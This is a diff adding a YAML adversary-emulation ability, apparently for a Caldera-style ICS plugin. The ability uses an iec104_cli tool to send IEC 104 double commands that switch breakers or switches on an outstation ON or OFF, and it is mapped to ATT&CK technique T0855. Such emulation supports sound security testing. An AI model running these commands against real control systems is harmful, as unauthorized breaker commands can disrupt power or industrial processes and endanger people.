@@ -1,0 +1,25 @@
+---
+
+- id: e6336ae4-01a8-4e8b-a00b-1eada8cce474
+  name: IEC 104 - Double Command
+  description: |
+    Send an IEC 60870-5-104 double command (C_DC_NA_1) to a control point,
+    driving it ON or OFF. Double commands carry a two-bit state and are commonly
+    used for breaker/switch control; an unauthorized double command can trip or
+    close such devices on the outstation.
+  tactic: impair-process-control
+  technique_id: T0855
+  technique_name: Unauthorized Command Message
+  executors:
+  - platform: linux
+    name: sh
+    command: >
+      ./iec104_cli #{iec104.server.ip} --port #{iec104.server.port} --ca #{iec104.common_address} double-command #{iec104.command.ioa} #{iec104.command.value}
+    payloads:
+    - iec104_cli
+  - platform: windows
+    name: psh
+    command: >
+      .\iec104_cli.exe #{iec104.server.ip} --port #{iec104.server.port} --ca #{iec104.common_address} double-command #{iec104.command.ioa} #{iec104.command.value}
+    payloads:
+    - iec104_cli.exe
